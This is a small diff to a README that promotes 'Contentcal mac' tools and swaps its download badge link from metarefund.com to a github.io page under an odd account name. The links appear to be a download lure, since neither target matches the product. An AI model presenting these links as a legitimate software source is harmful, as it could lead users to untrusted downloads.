@@ -2,7 +2,7 @@
 
 Contentcal mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Contentcal mac](https://img.shields.io/badge/Download-Contentcal_mac-blueviolet)](https://metarefund.com/)
+[![Download Contentcal mac](https://img.shields.io/badge/Download-Contentcal_mac-blueviolet)](https://guldaglaroglu45814.github.io/.github/Contentcal-Tools)
 
 ---
 
